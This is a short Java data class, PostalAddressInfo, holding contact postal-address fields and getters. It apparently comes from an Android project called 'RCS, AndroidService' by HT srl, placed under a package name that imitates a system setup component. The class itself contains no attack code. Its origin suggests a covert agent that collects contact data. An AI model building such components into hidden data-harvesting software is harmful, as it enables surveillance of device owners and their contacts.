/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : PostalAddressInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.module.task;

public class PostalAddressInfo {
	private static final String TAG = "PostalAddressInfo"; //$NON-NLS-1$

	private final long userId;
	private final int type;
	private final String street, poBox, neighbor, city;
	private final String state, postalCode, country;

	public PostalAddressInfo(long userId, int type, String street, String poBox, String neighbor, String city,
			String state, String postalCode, String country) {

		this.userId = userId;
		this.type = type;
		this.street = street;
		this.poBox = poBox;
		this.neighbor = neighbor;
		this.city = city;
		this.state = state;
		this.postalCode = postalCode;
		this.country = country;
	}

	public long getUserId() {
		return userId;
	}

	public int getType() {
		return type;
	}

	public String getStreet() {
		return street;
	}

	public String getPoBox() {
		return poBox;
	}

	public String getNeighbor() {
		return neighbor;
	}

	public String getCity() {
		return city;
	}

	public String getState() {
		return state;
	}

	public String getPostalCode() {
		return postalCode;
	}

	public String getCountry() {
		return country;
	}
}
